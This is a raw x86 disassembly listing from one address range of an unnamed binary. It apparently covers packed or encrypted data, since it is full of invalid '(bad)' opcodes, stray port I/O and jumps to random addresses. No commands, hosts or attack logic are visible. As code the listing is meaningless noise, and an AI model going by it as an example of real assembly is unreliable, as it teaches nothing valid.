  40927c:	loopne 0x409236
  40927e:	sub    ebx,ebp
  409280:	stos   BYTE PTR es:[edi],al
  409281:	daa    
  409282:	jp     0x4092bf
  409284:	retf   
  409285:	loopne 0x40928e
  409287:	outs   dx,DWORD PTR ds:[esi]
  409288:	gs mov dh,0xba
  40928b:	sbb    ah,BYTE PTR [ebx]
  40928d:	sbb    esi,DWORD PTR [esp+eax*1-0x59]
  409291:	sbb    BYTE PTR [edi+0x16],0xd4
  409295:	cmp    al,0x9a
  409297:	add    edi,DWORD PTR [eax-0x2b]
  40929a:	jo     0x4092b5
  40929c:	aaa    
  40929d:	and    edx,DWORD PTR [ebx+eax*8+0x76]
  4092a1:	dec    esp
  4092a2:	scas   al,BYTE PTR es:[edi]
  4092a3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092a5:	or     al,0x52
  4092a7:	inc    ebp
  4092a8:	add    ecx,DWORD PTR [eax-0x21]
  4092ab:	out    dx,eax
  4092ac:	cmp    DWORD PTR [ebx],0xb28340c1
  4092b2:	es std 
  4092b4:	sbb    eax,0x10a8bc5d
  4092b9:	sbb    ch,BYTE PTR [esi+ecx*8-0x21]
  4092bd:	mov    al,ds:0x58211114
  4092c2:	cmp    BYTE PTR [esi+0x1a],ch
  4092c5:	adc    al,0x68
  4092c7:	mov    ds:0xb0f9e38f,eax
  4092cc:	jecxz  0x409336
  4092ce:	inc    eax
  4092cf:	mov    ebp,0x3c474fd3
  4092d4:	loop   0x40933e
  4092d6:	xchg   DWORD PTR [esp+ebx*2+0x68afd73e],ecx
  4092dd:	mov    dl,0x69
  4092df:	les    esi,FWORD PTR [ebp+0x3f]
  4092e2:	pop    es
  4092e3:	test   ecx,ebp
  4092e5:	jno    0x40928a
  4092e7:	fstp   QWORD PTR [ebx+edx*8+0x32]
  4092eb:	sub    eax,0xe93b7287
  4092f0:	jmp    0x72f8:0xe4359be
  4092f7:	pop    esi
  4092f8:	mov    ebp,DWORD PTR [esi+0x8452b53]
  4092fe:	pop    ebx
  4092ff:	cld    
  409300:	dec    ecx
  409301:	mov    ch,BYTE PTR [eax]
  409303:	cdq    
  409304:	jp     0x4092f8
  409306:	mov    esp,0x5689defa
  40930b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40930c:	(bad)  
  40930e:	dec    ecx
  40930f:	je     0x4092f2
  409311:	std    
  409312:	jl     0x409343
  409314:	add    DWORD PTR [esi+0x49],edi
  409317:	pop    ecx
  409318:	xchg   edx,eax
  409319:	daa    
  40931a:	pop    edx
  40931b:	xchg   edi,eax
  40931c:	lods   al,BYTE PTR ds:[esi]
  40931d:	enter  0x4d38,0x80
  409321:	aad    0x3a
  409323:	out    0xa4,eax
  409325:	inc    edx
  409326:	in     al,dx
  409327:	neg    BYTE PTR [edi+0x224cd6a1]
  40932d:	fs in  al,dx
  40932f:	fstp   DWORD PTR [esi]
  409331:	shl    DWORD PTR [ebx-0xb631658],1
  409337:	cmp    DWORD PTR [ebx+eax*8],edx
  40933a:	fild   WORD PTR [edx]
  40933c:	xchg   ebx,eax
  40933d:	cvtdq2ps xmm1,xmm5
  409340:	cs popf 
  409342:	add    al,0xd6
  409344:	jg     0x4093a1
  409346:	or     BYTE PTR [edx],dl
  409348:	mov    edx,0x73139e5e
  40934d:	xlat   BYTE PTR ds:[ebx]
  40934e:	ja     0x40933b
  409350:	scas   al,BYTE PTR es:[edi]
  409351:	mov    cl,0x4c
  409353:	gs push ss
  409355:	out    0xa7,eax
  409357:	pop    esp
  409358:	and    BYTE PTR [edx+0x2d87f237],bl
  40935e:	(bad)  
  40935f:	js     0x4093ae
  409361:	repz and eax,0x35a2937c
  409367:	sub    eax,ecx
  409369:	and    bh,BYTE PTR [edi+ebp*8-0x7c3b6444]
  409370:	ins    DWORD PTR es:[edi],dx
  409371:	xchg   BYTE PTR [edi+ebx*4+0x2f],bl
  409375:	das    
  409376:	nop
  409377:	ss mov dh,0xaa
  40937a:	outs   dx,DWORD PTR ds:[esi]
  40937b:	in     al,dx
  40937c:	sbb    ch,BYTE PTR [ebx+edx*8-0x50]
  409380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409381:	sbb    al,0x0
  409383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409384:	ret    
  409385:	enter  0xef8e,0x40
  409389:	mov    al,0x37
  40938b:	ret    0x7580
  40938e:	push   edi
  40938f:	jne    0x409355
  409391:	jmp    DWORD PTR [ebp+0x23f8a8f5]
  409397:	enter  0x90c9,0x15
  40939b:	repnz loop 0x40940e
  40939e:	sub    eax,ebp
  4093a0:	(bad)  
  4093a2:	push   esi
  4093a3:	adc    eax,0xc0e509bc
  4093a8:	dec    ecx
  4093a9:	cli    
  4093aa:	xor    ebp,DWORD PTR [edi+0x7d48dad8]
  4093b0:	test   cl,ch
  4093b2:	ret    
  4093b3:	inc    ecx
  4093b4:	inc    eax
  4093b5:	sub    BYTE PTR [ebx+0x4d],dl
  4093b8:	je     0x4093c0
  4093ba:	sbb    ah,BYTE PTR [ebx+0x4]
  4093bd:	sbb    eax,0xa9f63253
  4093c2:	fild   DWORD PTR [ebp+0x7c]
  4093c5:	pop    esp
  4093c6:	sub    al,0x5c
  4093c8:	scas   al,BYTE PTR es:[edi]
  4093c9:	(bad)  
  4093ca:	loope  0x409397
  4093cc:	xor    ecx,DWORD PTR [ebx+0x22ab2d8e]
  4093d2:	gs aas 
  4093d4:	cmp    al,0xf9
  4093d6:	fsubr  DWORD PTR [esi+0x4246e6e2]
  4093dc:	mov    eax,0xe7bb6f42
  4093e1:	div    dh
  4093e3:	test   DWORD PTR [eax+ebp*1],ecx
  4093e6:	cmp    al,0xb4
  4093e8:	mov    ebx,0xf399d1f2
  4093ed:	dec    edi
  4093ee:	sahf   
  4093ef:	fcom   st(5)
  4093f1:	inc    eax
  4093f2:	repz jno 0x40940b
  4093f5:	dec    ebp
  4093f6:	div    eax
  4093f8:	mov    al,ds:0x1cdbc09b
  4093fd:	cmp    BYTE PTR [edx+0xb59bec6],0xb0
  409404:	inc    edx
  409405:	xor    DWORD PTR [eax+0x388a9345],edx
  40940b:	mov    edx,0xa805bbb8
  409410:	mov    ebp,0x9d85236b
  409415:	cmp    edi,DWORD PTR [ebp-0x80]
  409418:	or     cl,dh
  40941a:	(bad)  
  40941b:	fcomi  st,st(7)
  40941d:	scas   al,BYTE PTR es:[edi]
  40941e:	or     BYTE PTR es:[esp+ecx*1+0x595b221],0xb
  409427:	cmp    ebx,esi
  409429:	scas   al,BYTE PTR es:[edi]
  40942a:	mov    edi,0xac4acd03
  40942f:	pop    ebx
  409430:	mov    al,ds:0x5c610bc0
  409435:	xchg   edi,eax
  409436:	jne    0x4093c2
  409438:	arpl   sp,bp
  40943a:	pop    edi
  40943b:	loopne 0x40941a
  40943d:	repz fcom QWORD PTR ds:0x75ca63af
  409444:	pushf  
  409445:	sbb    eax,0x8a377f20
  40944a:	call   0x86ab:0x860d2dd
  409451:	mov    ebp,0xc56204f4
  409456:	repnz sbb bh,BYTE PTR [ebx+0x4615af3f]
  40945d:	jbe    0x4093f0
  40945f:	cdq    
  409460:	and    ecx,ecx
  409462:	loope  0x4094a6
  409464:	mov    cl,0x7
  409466:	inc    eax
  409467:	fsub   DWORD PTR [edx]
  409469:	ss or  eax,0xc5c071
  40946f:	adc    eax,ebx
  409471:	push   esi
  409472:	out    dx,al
  409473:	cdq    
  409474:	push   0xffffffce
  409476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409477:	pop    edi
  409478:	fldenv [eax]
  40947a:	push   esi
  40947b:	stos   BYTE PTR es:[edi],al
  40947c:	push   ebx
  40947d:	test   eax,0x883b58ba
  409482:	or     bl,bh
  409484:	adc    eax,0x4c92e04b
  409489:	sbb    BYTE PTR [ecx*1+0x3c722a93],al
  409490:	shl    DWORD PTR [eax-0x17e81b97],1
  409496:	xchg   DWORD PTR ds:0x3a4bf973,ebx
  40949c:	pop    es
  40949d:	cmc    
  40949e:	shl    BYTE PTR [edi+0x65],0xa8
  4094a2:	cmp    al,ch
  4094a4:	imul   ebx,DWORD PTR [edi+0x1fb2728f],0x5d
  4094ab:	clc    
  4094ac:	push   ecx
  4094ad:	inc    esp
  4094ae:	int    0x57
  4094b0:	and    dl,BYTE PTR [eax+0x150801f4]
  4094b6:	pop    ebp
  4094b7:	cld    
  4094b8:	sbb    bh,BYTE PTR ds:0xc5c9df3d
  4094be:	fs pop ss
  4094c0:	push   ds
  4094c1:	jbe    0x4094aa
  4094c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094c4:	(bad)  
  4094c5:	lea    ebp,[edi+edx*1-0x60]
  4094c9:	int    0x53
  4094cb:	lahf   
  4094cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094cd:	and    al,0x9a
  4094cf:	js     0x409516
  4094d1:	mov    bh,0x88
  4094d3:	dec    edi
  4094d4:	icebp  
  4094d5:	(bad)  [eax+0x7]
  4094d8:	jb     0x4094ea
  4094da:	dec    esp
  4094db:	ds add esp,0xfffffff1
  4094df:	and    BYTE PTR [ebp+0x2],ch
  4094e2:	arpl   WORD PTR [esi],sp
  4094e4:	ret    0xbec8
  4094e7:	ds rcl eax,0x19
  4094eb:	shl    ecx,0x51
  4094ee:	dec    esi
  4094ef:	jmp    0x28416592
  4094f4:	fcmovbe st,st(5)
  4094f6:	(bad)  
  4094f7:	stc    
  4094f8:	push   esp
  4094f9:	retf   0x710a
  4094fc:	in     eax,dx
  4094fd:	inc    esi
  4094fe:	mov    ecx,0x5788f42f
  409503:	pop    esp
  409504:	es cdq 
  409506:	sar    BYTE PTR [esi+0xeffecd5],cl
  40950c:	mov    ds:0x3029f819,eax
  409511:	sbb    BYTE PTR es:[edi],al
  409514:	xor    ebp,DWORD PTR [ecx+0x43701b30]
  40951a:	call   0x959d:0xb3112041
  409521:	mov    al,ds:0xe407c10c
  409526:	ret    
  409527:	xlat   BYTE PTR ds:[ebx]
  409528:	pop    eax
  409529:	leave  
  40952a:	addr16 inc ecx
  40952c:	hlt    
  40952d:	stos   BYTE PTR es:[edi],al
  40952e:	or     DWORD PTR [esp+ecx*4+0x1e0dc151],esp
  409535:	out    0x57,eax
  409537:	jle    0x409578
  409539:	xor    eax,DWORD PTR [ebp+eiz*8+0x65]
  40953d:	push   edx
  40953e:	push   ds
  40953f:	sub    al,0xe7
  409541:	iret   
  409542:	mov    eax,0xc3ae7407
  409547:	push   esi
  409548:	add    DWORD PTR [eax+esi*2-0x31d8e9a7],0x858b1eb1
  409553:	sti    
  409554:	ins    BYTE PTR es:[edi],dx
  409555:	sub    bh,bh
  409557:	jno    0x40955a
  409559:	cmp    edi,DWORD PTR es:[ebx+0x4]
  40955d:	jae    0x409505
  40955f:	cmp    BYTE PTR [ebx-0x3e3c3297],ah
  409565:	mov    dh,BYTE PTR ss:[ecx-0x54]
  409569:	(bad)  
  40956a:	addr16 push 0x2c5f8c13
  409570:	jb     0x4095e1
  409572:	adc    al,0xbb
  409574:	or     DWORD PTR [edi],0xb48e64a0
  40957a:	add    al,0x44
  40957c:	sbb    esi,eax
  40957e:	std    
  40957f:	mov    ah,0x1
  409581:	popa   
  409582:	pmullw mm7,QWORD PTR [eax]
  409585:	push   cs
  409586:	ror    DWORD PTR [ecx-0x7f],0xf4
  40958a:	sbb    dh,BYTE PTR [esi-0x51]
  40958d:	cmp    al,al
  40958f:	outs   dx,BYTE PTR ds:[esi]
  409590:	fisub  WORD PTR [eax+0x571a955c]
  409596:	or     eax,0x6da3c248
  40959b:	jno    0x40959d
  40959d:	pop    ebx
  40959e:	ins    DWORD PTR es:[edi],dx
  40959f:	dec    DWORD PTR [eax+0x39]
  4095a2:	outs   dx,DWORD PTR ds:[esi]
  4095a3:	and    bh,BYTE PTR [ebx+0xea16ee2]
  4095a9:	in     eax,dx
  4095aa:	ins    BYTE PTR es:[edi],dx
  4095ab:	or     BYTE PTR [eax-0x7c1b9758],ch
  4095b1:	push   eax
  4095b2:	mov    bl,0x7e
  4095b4:	dec    eax
  4095b5:	adc    eax,0xe9e92238
  4095ba:	jae    0x40955b
  4095bc:	iret   
  4095bd:	std    
  4095be:	xor    al,0x9b
  4095c0:	pop    esp
  4095c1:	rol    DWORD PTR [edi],0xdd
  4095c4:	pand   mm0,QWORD PTR ds:0x96ba4aa2
  4095cb:	out    0x5c,eax
  4095cd:	icebp  
  4095ce:	mov    esi,DWORD PTR [ecx-0x7594128f]
  4095d4:	mov    eax,0x8b43e772
  4095d9:	scas   eax,DWORD PTR es:[edi]
  4095da:	daa    
  4095db:	sbb    edx,esp
  4095dd:	in     eax,0x4
  4095df:	out    0xea,eax
  4095e1:	ds (bad) 
  4095e4:	pop    eax
  4095e5:	mov    esp,0x845bdec7
  4095ea:	ret    
  4095eb:	cmp    bh,BYTE PTR [edi+0x69924d5a]
  4095f1:	add    al,0x8c
  4095f3:	enter  0x525c,0xc5
  4095f7:	arpl   WORD PTR [ebp+ebx*1+0x8b2e424],dx
  4095fe:	pop    edi
  4095ff:	es dec edi
  409601:	mov    edx,0x7396de52
  409606:	cdq    
  409607:	lock lds esp,FWORD PTR [ebp-0x12]
  40960b:	out    dx,eax
  40960c:	dec    ecx
  40960d:	lahf   
  40960e:	sub    dh,ch
  409610:	dec    ecx
  409611:	dec    edi
  409612:	sbb    eax,0x120ef956
  409617:	ja     0x4095fc
  409619:	(bad)  
  40961a:	xchg   ebp,eax
  40961b:	ficomp WORD PTR [ebp-0x2fe78ae3]
  409621:	adc    bl,BYTE PTR [esp+ebx*2+0x3c]
  409625:	mov    ch,0x9c
  409627:	pop    eax
  409628:	mov    dl,0x2b
  40962a:	les    esi,FWORD PTR [ecx+0x47]
  40962d:	pushf  
  40962e:	inc    esi
  40962f:	xchg   ebp,eax
  409630:	repnz mov al,ds:0x7ddaebac
  409636:	repz out dx,eax
  409638:	aad    0x31
  40963a:	or     DWORD PTR [edi+0x46],0xe0b50de3
  409641:	int3   
  409642:	shl    DWORD PTR es:[ebx+0x5c],cl
  409646:	jne    0x4095eb
  409648:	es loop 0x4096a8
  40964b:	loope  0x4096c5
  40964d:	xchg   esi,eax
  40964e:	mov    cl,0xb3
  409650:	and    edx,DWORD PTR [edi-0x3aabdec0]
  409656:	clc    
  409657:	jo     0x40960c
  409659:	pusha  
  40965a:	scas   eax,DWORD PTR es:[edi]
  40965b:	jge    0x4095f4
  40965d:	sbb    DWORD PTR [eax],ecx
  40965f:	(bad)  
  409660:	icebp  
  409661:	mov    eax,ds:0xa3986623
  409666:	adc    al,0xa
  409668:	imul   esp,DWORD PTR [eax],0x59bf1a04
  40966e:	retf   0xb8bd
  409671:	or     DWORD PTR [bx+di],ecx
  409674:	jno    0x40962b
  409676:	mov    eax,0x151a3480
  40967b:	cmp    bl,BYTE PTR [edx+0x5]
  40967e:	inc    edx
  40967f:	and    eax,0xe302c27c
  409684:	nop
  409685:	mov    ecx,0x4fe57f0a
  40968a:	mov    al,0xeb
  40968c:	stos   BYTE PTR es:[edi],al
  40968d:	xchg   ebx,eax
  40968e:	stos   DWORD PTR es:[edi],eax
  40968f:	and    ebp,DWORD PTR [esi+0x19]
  409692:	inc    ebp
  409693:	loop   0x409713
  409695:	in     eax,dx
  409696:	push   0xa98771b4
  40969b:	xor    al,0xe4
  40969d:	mov    dh,0xa
  40969f:	imul   esi,DWORD PTR [eax],0x93bebdeb
  4096a5:	pushf  
  4096a6:	adc    al,0x23
  4096a8:	or     DWORD PTR [ebp-0x56],ecx
  4096ab:	jmp    0x6004af66
  4096b0:	lea    edx,[esi+edx*1-0x26c6a518]
  4096b7:	push   cs
  4096b8:	mov    BYTE PTR [ecx+0x59a55192],ch
  4096be:	mov    eax,0x2a925dba
  4096c3:	or     DWORD PTR [ebx+edx*2-0x3e],esi
  4096c7:	inc    eax
  4096c8:	clc    
  4096c9:	jne    0x409735
  4096cb:	pop    ebp
  4096cc:	push   eax
  4096cd:	xchg   edx,eax
  4096ce:	cmp    bl,al
  4096d0:	leave  
  4096d1:	xchg   esp,eax
  4096d2:	add    dl,BYTE PTR [ebp+0x4]
  4096d5:	clc    
  4096d6:	dec    ecx
  4096d7:	adc    al,0x94
  4096d9:	pusha  
  4096da:	shl    BYTE PTR [ebx+0x7],1
  4096dd:	and    esp,esp
  4096df:	or     edx,esp
  4096e1:	push   edx
  4096e2:	cmp    DWORD PTR [ecx],ecx
  4096e4:	jl     0x4096d8
  4096e6:	nop
  4096e7:	mov    ds,edi
  4096e9:	sub    dh,BYTE PTR [edi+0xc]
  4096ec:	push   ss
  4096ed:	(bad)  
  4096ee:	adc    dh,bl
  4096f0:	or     eax,DWORD PTR [edx-0x1a]
  4096f3:	test   DWORD PTR [edi-0x47],esi
  4096f6:	sub    eax,0x59a7a14a
  4096fb:	jmp    0x2ce73ebf
  409700:	or     DWORD PTR [edi],0x24
  409703:	fmul   QWORD PTR [eax-0x5d]
  409706:	lea    ebp,[esi]
  409708:	fcom   DWORD PTR [esi]
  40970a:	ret    0xa94e
  40970d:	stos   BYTE PTR es:[edi],al
  40970e:	push   edi
  40970f:	fimul  WORD PTR [eax]
  409711:	mov    edi,DWORD PTR [edi-0x177629bb]
  409717:	outs   dx,BYTE PTR ds:[esi]
  409718:	mov    esi,DWORD PTR [eax]
  40971a:	in     al,dx
  40971b:	adc    BYTE PTR [ebx+0x2e],ah
  40971e:	add    al,0xd7
  409720:	std    
  409721:	sub    cl,dh
  409723:	out    0xf8,eax
  409725:	nop
  409726:	mov    ds:0x2e177b26,eax
  40972b:	xchg   BYTE PTR [ebp+0x28],al
  40972e:	cmp    WORD PTR [esi],bx
  409731:	jae    0x4097af
  409733:	and    ch,bl
  409735:	or     DWORD PTR [ebp-0x4d],esp
  409738:	(bad)  
  409739:	cmc    
  40973a:	ficom  WORD PTR [edi+edx*8]
  40973d:	cmc    
  40973e:	je     0x409786
  409740:	cld    
  409741:	jns    0x40979a
  409743:	and    BYTE PTR [eax],0x76
  409746:	jbe    0x4096d0
  409748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409749:	add    al,0x5e
  40974b:	add    al,0x7
  40974d:	or     al,0x4b
  40974f:	push   edi
  409750:	sbb    DWORD PTR [edx],edi
  409752:	ret    
  409753:	jne    0x4096eb
  409755:	jns    0x409710
  409757:	test   eax,0x9896193f
  40975c:	loop   0x4097d5
  40975e:	dec    edi
  40975f:	sar    DWORD PTR [esi-0x1b],1
  409762:	cmp    ebp,DWORD PTR [esp+ecx*4]
  409765:	out    dx,eax
  409766:	inc    ecx
  409767:	or     DWORD PTR [esi],edx
  409769:	xchg   ebx,eax
  40976a:	fstp   QWORD PTR [esi-0x731de352]
  409770:	(bad)  
  409772:	push   ss
  409773:	mov    ds:0xdde9311a,al
  409778:	outs   dx,DWORD PTR ds:[esi]
  409779:	mov    edi,0xf032d4ac
  40977e:	push   cs
  40977f:	pop    ebp
  409780:	or     edi,ebp
  409782:	jo     0x4097ee
  409784:	push   0xffffff84
  409786:	ss jecxz 0x40979e
  409789:	sub    al,0x8f
  40978b:	popf   
  40978c:	ss pop ecx
  40978e:	mov    edi,0xa2c8ddec
  409793:	arpl   si,si
  409795:	dec    esp
  409796:	inc    esi
  409797:	stos   DWORD PTR es:[edi],eax
  409798:	test   DWORD PTR ds:0x52dd8927,eax
  40979e:	mov    esi,0x4cb2f91f
  4097a3:	(bad)  
  4097a4:	mov    cl,BYTE PTR [ebx-0x433c7f1f]
  4097aa:	and    eax,0x33c0f715
  4097af:	add    eax,esp
  4097b1:	push   es
  4097b2:	das    
  4097b3:	loop   0x4097f8
  4097b5:	jbe    0x4097da
  4097b7:	mov    ecx,0x1121b8ca
  4097bc:	mov    ds:0xe86044bb,al
  4097c1:	dec    ebp
  4097c2:	add    DWORD PTR [ecx-0x6a],esi
  4097c5:	call   0xf13f:0x6fdcf812
  4097cc:	dec    edx
  4097cd:	sub    eax,0xc2147d7e
  4097d2:	xchg   ecx,eax
  4097d3:	pop    ebp
  4097d4:	lahf   
  4097d5:	mov    ah,0xa4
  4097d7:	shr    DWORD PTR [edi],1
  4097d9:	ret    
  4097da:	or     DWORD PTR [ebx-0x6c],eax
  4097dd:	in     al,0x9
  4097df:	jp     0x40983a
  4097e1:	inc    edi
  4097e2:	in     eax,0x71
  4097e4:	lds    edx,FWORD PTR [ecx-0x33528cf2]
  4097ea:	into   
  4097eb:	scas   eax,DWORD PTR es:[edi]
  4097ec:	mov    ebx,0x86585408
  4097f1:	enter  0xb06a,0xc0
  4097f5:	xlat   BYTE PTR ds:[ebx]
  4097f6:	call   0x5065f665
  4097fb:	jp     0x40980b
  4097fd:	(bad)  
  4097fe:	push   edi
  4097ff:	lods   al,BYTE PTR ds:[esi]
  409800:	iret   
  409801:	ja     0x40982b
  409803:	inc    eax
  409804:	mov    edx,esp
  409806:	ins    BYTE PTR es:[edi],dx
  409807:	fist   DWORD PTR [eax-0x78]
  40980a:	test   DWORD PTR [ecx],0x4883a61e
  409810:	cmp    ecx,DWORD PTR [edx]
  409812:	jnp    0x4097be
  409814:	push   ds
  409815:	not    BYTE PTR [eax]
  409817:	lock sbb al,0xb1
  40981a:	cdq    
  40981b:	xor    eax,0x86f23c8
  409820:	addr16 int3 
  409822:	(bad)  
  409823:	push   esi
  409824:	and    eax,0x49b7293f
  409829:	je     0x40982f
  40982b:	push   esi
  40982c:	retf   
  40982d:	cwde   
  40982e:	aad    0xbb
  409830:	fwait
  409831:	cmp    bl,BYTE PTR [eax-0x5d]
  409834:	pop    ds
  409835:	mov    gs,WORD PTR [ebx-0x7f43a01e]
  40983b:	mov    edx,0xe6ec18ea
  409840:	rol    BYTE PTR [eax+0x5d],cl
  409843:	inc    ebp
  409844:	xor    esi,ebx
  409846:	inc    edi
  409847:	je     0x409877
  409849:	ret    0x5b2a
  40984c:	popa   
  40984d:	sbb    bl,al
  40984f:	sub    eax,0x73f78e70
  409854:	fiadd  WORD PTR [ecx]
  409856:	push   ebx
  409857:	and    DWORD PTR [esp+esi*8],edi
  40985a:	mov    cl,0xbe
  40985c:	xor    dl,BYTE PTR [edi]
  40985e:	jns    0x40985c
  409860:	mov    edi,0x10aada7e
  409865:	push   ss
  409866:	ss cwde 
  409868:	out    0xe6,eax
  40986a:	repnz mov eax,cs:0x83b1309f
  409871:	and    ebp,DWORD PTR ds:0xe45bd96d
  409877:	jp     0x409839
  409879:	addr16 mov bl,0x82
  40987c:	pushf  
  40987d:	test   BYTE PTR [ebx+0x3a],ch
  409880:	ror    ebp,cl
  409882:	lahf   
  409883:	sub    esp,0xffffffc4
  409886:	icebp  
  409887:	rcl    DWORD PTR [esi+0x3b],0xd6
  40988b:	imul   ecx,DWORD PTR [ecx+0x22],0x71
  40988f:	sub    eax,0xce962088
  409894:	(bad)  
  409895:	shl    BYTE PTR [ecx-0x2087e24a],cl
  40989b:	push   es
  40989c:	xchg   eax,eax
  40989e:	ror    eax,cl
  4098a0:	stos   DWORD PTR es:[edi],eax
  4098a1:	push   eax
  4098a2:	sub    DWORD PTR [ebp+0x1c],0xffffffa8
  4098a6:	arpl   WORD PTR [edi+0x212d3921],dx
  4098ac:	imul   edx,DWORD PTR [edx],0xd29c4aae
  4098b2:	sub    bh,BYTE PTR [edx-0x76]
  4098b5:	stos   BYTE PTR es:[edi],al
  4098b6:	sub    esi,DWORD PTR [eax]
  4098b8:	dec    edx
  4098b9:	test   eax,0x3cea27ec
  4098be:	test   eax,0xe47562b5
  4098c3:	or     BYTE PTR [edx+eax*1],cl
  4098c6:	or     BYTE PTR [ebp-0x4df8c3a8],al
  4098cc:	pushf  
  4098cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098ce:	mov    ah,0x69
  4098d0:	pop    esp
  4098d1:	dec    ecx
  4098d2:	jmp    0x75ce1da1
  4098d7:	inc    DWORD PTR [ebx+0x6d6f1b1c]
  4098dd:	xor    DWORD PTR [ecx*8-0x378c9fa9],ebx
  4098e4:	push   eax
  4098e5:	ss fwait
  4098e7:	jg     0x4098b5
  4098e9:	out    0x8f,al
  4098eb:	jge    0x40989a
  4098ed:	leave  
  4098ee:	rol    BYTE PTR [edx+0x3],1
  4098f1:	imul   ebp,ebx,0xffffff8f
  4098f4:	add    eax,DWORD PTR gs:[ebx+0x654b3c92]
  4098fb:	in     eax,dx
  4098fc:	sub    al,0xf0
  4098fe:	adc    eax,0x54a9ca7d
  409903:	adc    BYTE PTR [edx],cl
  409905:	mov    esp,0x9e6b4f65
  40990a:	sbb    eax,0xa41fca23
  40990f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409910:	pop    esp
  409911:	in     eax,0x16
  409913:	pop    edx
  409914:	xchg   ebp,eax
  409915:	xchg   ecx,eax
  409916:	dec    eax
  409917:	dec    edx
  409918:	and    eax,0xfd2f6c45
  40991d:	imul   eax,DWORD PTR [ebx+0x40],0xffffffbb
  409921:	imul   ecx,ebp,0x3969b1ff
  409927:	add    ecx,DWORD PTR [ecx]
  409929:	mov    ds:0x4cc32776,eax
  40992e:	dec    edi
  40992f:	sub    al,0xe
  409931:	adc    DWORD PTR [ebx+edi*4],esi
  409934:	repz sbb eax,0xd048097f
  40993a:	das    
  40993b:	add    esi,DWORD PTR [edi+0x5b9079c5]
  409941:	je     0x40996b
  409943:	outs   dx,BYTE PTR ds:[esi]
  409944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409945:	inc    edx
  409946:	mov    ebx,0x99b202d6
  40994b:	repz mov WORD PTR [eax+0x30c72e4c],fs
  409952:	pop    esi
  409954:	pop    ss
  409955:	hlt    
  409956:	aaa    
  409957:	addr16 dec ebx
  409959:	iret   
  40995a:	imul   ecx,DWORD PTR [esi-0x3a902781],0x41d79020
  409964:	dec    ebx
  409965:	lock xchg BYTE PTR [eax+0x3088ce9b],dh
  40996c:	xchg   ecx,eax
  40996d:	add    eax,0x155022ff
  409972:	cmp    DWORD PTR [eax-0x2f],ecx
  409975:	pop    ebx
  409976:	add    ch,BYTE PTR es:[esi+0x70]
  40997a:	dec    ebx
  40997b:	out    0xca,eax
  40997d:	leave  
  40997e:	pusha  
  40997f:	out    0x11,eax
  409981:	sbb    BYTE PTR [edx-0x47],dh
  409984:	jns    0x4099c4
  409986:	push   esi
  409987:	push   edi
  409988:	test   BYTE PTR [ebx+0x3e6d6f03],0x6a
  40998f:	add    BYTE PTR [edi+0x2557c34c],al
  409995:	sub    eax,0xf68e5474
  40999a:	inc    edi
  40999b:	jne    0x409a1a
  40999d:	sbb    DWORD PTR [edi-0x71a90819],edi
  4099a3:	inc    eax
  4099a4:	pop    es
  4099a5:	and    dh,BYTE PTR [ebx+0x6d8ee668]
  4099ab:	jne    0x4099d9
  4099ad:	fidiv  DWORD PTR [ebx-0x3656ec66]
  4099b3:	xor    al,0x25
  4099b5:	inc    ebp
  4099b6:	cmp    eax,0xa4b22741
  4099bb:	pop    ds
  4099bc:	mov    DWORD PTR [eax+0x67c12e7b],edx
  4099c2:	aad    0x6b
  4099c4:	sbb    DWORD PTR [eax-0x38c46cb4],esp
  4099ca:	(bad)  
  4099cb:	and    ah,BYTE PTR [ebx+eax*8+0x172d2a54]
  4099d2:	lea    edi,[edi]
  4099d4:	daa    
  4099d5:	test   BYTE PTR [ecx],0x6d
  4099d8:	adc    dl,BYTE PTR [ecx-0x77]
  4099db:	inc    edx
  4099dc:	mov    esp,0x18ef76fe
  4099e1:	not    DWORD PTR [edx-0x4]
  4099e4:	aad    0x7f
  4099e6:	lods   eax,DWORD PTR ds:[esi]
  4099e7:	outs   dx,WORD PTR ds:[esi]
  4099e9:	jl     0x409973
  4099eb:	lods   al,BYTE PTR ds:[esi]
  4099ec:	aaa    
  4099ed:	test   BYTE PTR [edi],cl
  4099ef:	pop    ecx
  4099f0:	adc    DWORD PTR cs:[eax+edx*1-0x36],esi
  4099f5:	loopne 0x409a4d
  4099f7:	xchg   BYTE PTR ds:0xf6ef0625,ah
  4099fd:	mov    ebx,0xcca00935
  409a02:	jno    0x409a5c
  409a04:	pop    ds
  409a05:	add    eax,0x998a4292
  409a0a:	in     al,0x92
  409a0c:	cwde   
  409a0d:	sbb    edi,DWORD PTR [edi]
  409a0f:	loopne 0x409a89
  409a11:	ss not ch
  409a14:	pop    ecx
  409a15:	adc    eax,0x78896bb1
  409a1a:	cmp    edx,DWORD PTR [edi]
  409a1c:	inc    edi
  409a1d:	(bad)  
  409a1e:	mov    ch,0x30
  409a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a21:	repnz icebp 
  409a23:	dec    esi
  409a24:	or     eax,0x7904e149
  409a29:	fldenv [eax+0x1e]
  409a2c:	(bad)  
  409a2d:	pop    edx
  409a2e:	push   ss
  409a2f:	mov    eax,0x6845fbac
  409a34:	mov    edx,0x3449df29
  409a39:	fld    TBYTE PTR [edi]
  409a3b:	sub    eax,0xabd6f4a0
  409a40:	pop    es
  409a41:	stc    
  409a42:	and    BYTE PTR [esi-0x42],cl
  409a45:	add    bl,bh
  409a47:	adc    al,BYTE PTR ds:0xcbfbe185
  409a4d:	cmp    DWORD PTR [ecx+0x1cffbc82],esi
  409a53:	add    DWORD PTR [eax-0x74],ebx
  409a56:	adc    BYTE PTR [edx-0x2d],dh
  409a59:	rcr    DWORD PTR ds:0x3ccd21d7,1
  409a5f:	jmp    0x4d946c6
  409a64:	dec    ebx
  409a65:	and    DWORD PTR [esi-0x3259f8d],ecx
  409a6b:	call   0x1bb7:0xcfa2fc3e
  409a72:	sub    eax,0x1675f1e1
  409a77:	test   al,0x58
  409a79:	jns    0x409a13
  409a7b:	mov    bh,0x56
